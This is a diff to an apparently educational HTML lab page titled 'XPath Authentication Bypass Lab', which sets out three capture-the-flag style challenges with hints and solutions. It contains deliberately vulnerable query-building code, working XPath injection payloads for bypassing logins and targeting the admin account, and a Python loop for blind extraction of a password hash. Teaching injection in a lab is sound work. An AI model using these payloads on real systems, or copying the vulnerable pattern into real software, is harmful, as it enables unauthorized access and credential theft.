@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XPath Authentication Bypass - 0xseanshin Hacking Notebook</title>
+    <title>XPath Authentication Bypass Lab - 0xseanshin Hacking Notebook</title>
     <link rel="stylesheet" href="../../style.css">
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -36,13 +36,23 @@
                 <div class="topic">
                     <div class="topic-header" onclick="toggleTopic(this)">
                         <i class="fas fa-chevron-right"></i>
-                        Bypass Techniques
+                        Challenge Progress
                     </div>
                     <div class="topic-content">
-                        <a href="#basic-bypass">Basic Bypass</a>
-                        <a href="#xpath-functions">XPath Functions</a>
-                        <a href="#position-based">Position Based</a>
-                        <a href="#pattern-search">Pattern Search</a>
+                        <div id="progress-tracker">
+                            <div class="progress-item">
+                                <span class="challenge-name">Basic Bypass</span>
+                                <span class="status incomplete"><i class="fas fa-circle"></i></span>
+                            </div>
+                            <div class="progress-item">
+                                <span class="challenge-name">Admin Access</span>
+                                <span class="status incomplete"><i class="fas fa-circle"></i></span>
+                            </div>
+                            <div class="progress-item">
+                                <span class="challenge-name">Blind Injection</span>
+                                <span class="status incomplete"><i class="fas fa-circle"></i></span>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -58,21 +68,56 @@
                 </div>
             </div>
 
-            <div class="lab-container">
-                <section class="login-section">
-                    <h2>Login Form</h2>
-                    <div class="login-form">
-                        <input type="text" id="username" placeholder="Username" class="code-input">
-                        <input type="password" id="password" placeholder="Password" class="code-input">
-                        <button class="btn" onclick="authenticate()">Login</button>
-                    </div>
-                    <div id="login-result"></div>
-                </section>
+            <div class="challenge-container">
+                <div class="challenge-tabs">
+                    <button class="tab-btn active" onclick="switchTab('challenge1')">Challenge 1: Basic Bypass</button>
+                    <button class="tab-btn" onclick="switchTab('challenge2')">Challenge 2: Admin Access</button>
+                    <button class="tab-btn" onclick="switchTab('challenge3')">Challenge 3: Blind Injection</button>
+                </div>
 
-                <section class="xml-viewer">
-                    <h2>XML Database</h2>
-                    <div class="code-block">
-                        <pre id="xml-content">
+                <div id="challenge1" class="challenge active">
+                    <div class="challenge-description">
+                        <h2>Challenge 1: Basic Authentication Bypass</h2>
+                        <p>Your goal is to bypass the login form without knowing valid credentials.</p>
+                        <div class="difficulty">Difficulty: Easy</div>
+                        <div class="points">Points: 100</div>
+                        
+                        <div class="vulnerable-code">
+                            <h3>Vulnerable Code Example:</h3>
+                            <pre class="code-block">
+const query = `/users/user[username/text()='${username}' 
+    and password/text()='${password}']`;
+const result = evaluator.evaluate(query, xmlDoc, null, 
+    XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);</pre>
+                        </div>
+                        
+                        <div class="hints">
+                            <button onclick="showHint('hint1')" class="hint-btn">Show Hint 1</button>
+                            <button onclick="showHint('hint2')" class="hint-btn">Show Hint 2</button>
+                            <div id="hint1" class="hint-content hidden">
+                                Think about how to make the XPath condition always true
+                            </div>
+                            <div id="hint2" class="hint-content hidden">
+                                The OR operator in XPath can be used to bypass conditions
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="lab-container">
+                        <section class="login-section">
+                            <h2>Login Form</h2>
+                            <div class="login-form">
+                                <input type="text" id="username" placeholder="Username" class="code-input">
+                                <input type="password" id="password" placeholder="Password" class="code-input">
+                                <button class="btn" onclick="authenticate()">Login</button>
+                            </div>
+                            <div id="login-result"></div>
+                        </section>
+
+                        <section class="xml-viewer">
+                            <h2>XML Database</h2>
+                            <div class="code-block">
+                                <pre id="xml-content">
 &lt;users&gt;
     &lt;user&gt;
         &lt;name first="Kaylie" last="Grenvile"/&gt;
@@ -93,55 +138,149 @@
         &lt;password&gt;295362c2618a05ba3899904a6a3f5bc0&lt;/password&gt;
     &lt;/user&gt;
 &lt;/users&gt;
-                        </pre>
-                    </div>
-                </section>
+                                </pre>
+                            </div>
+                        </section>
 
-                <section class="xpath-query">
-                    <h2>XPath Query</h2>
-                    <div class="code-block">
-                        <pre id="xpath-display">
+                        <section class="xpath-query">
+                            <h2>XPath Query</h2>
+                            <div class="code-block">
+                                <pre id="xpath-display">
 /users/user[username/text()='$USERNAME' and password/text()='$PASSWORD']
-                        </pre>
-                    </div>
-                </section>
-
-                <section class="payloads">
-                    <h2>Common Payloads</h2>
-                    <div class="payload-grid">
-                        <div class="payload-item" id="basic-bypass" onclick="setPayload(this)">
-                            <div class="payload-header">
-                                <h3>Basic Bypass</h3>
-                                <code>' or '1'='1</code>
+                                </pre>
                             </div>
-                            <p>Simple authentication bypass using OR condition</p>
-                        </div>
+                        </section>
 
-                        <div class="payload-item" id="xpath-functions" onclick="setPayload(this)">
-                            <div class="payload-header">
-                                <h3>XPath Functions</h3>
-                                <code>' or true() or '</code>
-                            </div>
-                            <p>Bypass using XPath's built-in functions</p>
-                        </div>
-
-                        <div class="payload-item" id="position-based" onclick="setPayload(this)">
-                            <div class="payload-header">
-                                <h3>Position Based</h3>
-                                <code>' or position()=2 or '</code>
-                            </div>
-                            <p>Target specific user by their position</p>
-                        </div>
-
-                        <div class="payload-item" id="pattern-search" onclick="setPayload(this)">
-                            <div class="payload-header">
-                                <h3>Pattern Search</h3>
-                                <code>' or contains(.,'admin') or '</code>
-                            </div>
-                            <p>Search for users matching specific patterns</p>
+                        <div class="answer-section">
+                            <h3>Solution</h3>
+                            <p>To bypass the basic authentication, you can use the following payload:</p>
+                            <pre class="code-block">Username: ' or '1'='1
+Password: ' or '1'='1</pre>
+                            <p>This works because:</p>
+                            <ul>
+                                <li>The single quote (') closes the existing string comparison</li>
+                                <li>The OR operator (or) allows us to add our own condition</li>
+                                <li>'1'='1' is always true, making the entire expression true</li>
+                                <li>The resulting XPath query becomes: <code>/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']</code></li>
+                            </ul>
                         </div>
                     </div>
-                </section>
+                </div>
+
+                <div id="challenge2" class="challenge hidden">
+                    <div class="challenge-description">
+                        <h2>Challenge 2: Admin Access</h2>
+                        <p>Your goal is to specifically access the admin account using XPath injection.</p>
+                        <div class="difficulty">Difficulty: Medium</div>
+                        <div class="points">Points: 200</div>
+                        
+                        <div class="vulnerable-code">
+                            <h3>Vulnerable Code Example:</h3>
+                            <pre class="code-block">
+// Server-side code checking for admin access
+if (result.snapshotLength > 0) {
+    const user = result.snapshotItem(0);
+    const isAdmin = user.querySelector('name').getAttribute('first') === 'Admin';
+    if (isAdmin) {
+        // Grant admin access
+    }
+}</pre>
+                        </div>
+                        
+                        <div class="hints">
+                            <button onclick="showHint('hint3')" class="hint-btn">Show Hint 1</button>
+                            <button onclick="showHint('hint4')" class="hint-btn">Show Hint 2</button>
+                            <div id="hint3" class="hint-content hidden">
+                                Look at the XML structure. How can you target a specific user?
+                            </div>
+                            <div id="hint4" class="hint-content hidden">
+                                XPath has functions to check node positions and attributes
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="lab-container">
+                        <!-- Same login form and XML viewer as Challenge 1 -->
+
+                        <div class="answer-section">
+                            <h3>Solution</h3>
+                            <p>To specifically target the admin account, you can use this payload:</p>
+                            <pre class="code-block">Username: ' or name/@first='Admin
+Password: ' or '1'='1</pre>
+                            <p>This works because:</p>
+                            <ul>
+                                <li>We target the specific attribute first="Admin" in the name element</li>
+                                <li>The resulting query will only match the user with Admin privileges</li>
+                                <li>Alternative payload: <code>' or //user[name/@first='Admin']</code></li>
+                                <li>The resulting XPath query becomes: <code>/users/user[username/text()='' or name/@first='Admin' and password/text()='' or '1'='1']</code></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="challenge3" class="challenge hidden">
+                    <div class="challenge-description">
+                        <h2>Challenge 3: Blind XPath Injection</h2>
+                        <p>The application no longer shows error messages or XML data. Extract the admin password using blind XPath injection techniques.</p>
+                        <div class="difficulty">Difficulty: Hard</div>
+                        <div class="points">Points: 300</div>
+                        
+                        <div class="vulnerable-code">
+                            <h3>Vulnerable Code Example:</h3>
+                            <pre class="code-block">
+// Blind XPath injection scenario
+const query = `/users/user[username/text()='${username}' 
+    and password/text()='${password}']`;
+return evaluator.evaluate(query, xmlDoc, null, 
+    XPathResult.BOOLEAN_TYPE, null).booleanValue;</pre>
+                        </div>
+                        
+                        <div class="hints">
+                            <button onclick="showHint('hint5')" class="hint-btn">Show Hint 1</button>
+                            <button onclick="showHint('hint6')" class="hint-btn">Show Hint 2</button>
+                            <div id="hint5" class="hint-content hidden">
+                                You can use string functions to extract data character by character
+                            </div>
+                            <div id="hint6" class="hint-content hidden">
+                                The substring() function can help extract specific characters
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="lab-container">
+                        <!-- Simplified login form without XML data display -->
+                        <section class="login-section">
+                            <h2>Secure Login Form</h2>
+                            <div class="login-form">
+                                <input type="text" id="username-blind" placeholder="Username" class="code-input">
+                                <input type="password" id="password-blind" placeholder="Password" class="code-input">
+                                <button class="btn" onclick="authenticateBlind()">Login</button>
+                            </div>
+                            <div id="login-result-blind"></div>
+                        </section>
+
+                        <div class="answer-section">
+                            <h3>Solution</h3>
+                            <p>For blind XPath injection, we can extract data character by character using this technique:</p>
+                            <pre class="code-block">Username: ' or substring((//user[name/@first='Admin']/password/text()),1,1)='2
+Password: anything</pre>
+                            <p>This works because:</p>
+                            <ul>
+                                <li>substring() extracts characters from a string</li>
+                                <li>We can iterate through positions and compare with possible characters</li>
+                                <li>A successful login indicates the character guess was correct</li>
+                                <li>Example script to automate extraction:</li>
+                            </ul>
+                            <pre class="code-block">
+for pos in range(1, 33):  # MD5 hash length
+    for char in '0123456789abcdef':  # MD5 characters
+        payload = f"' or substring((//user[name/@first='Admin']/password/text()),{pos},1)='{char}"
+        if try_login(payload):  # If login successful
+            password += char
+            break</pre>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
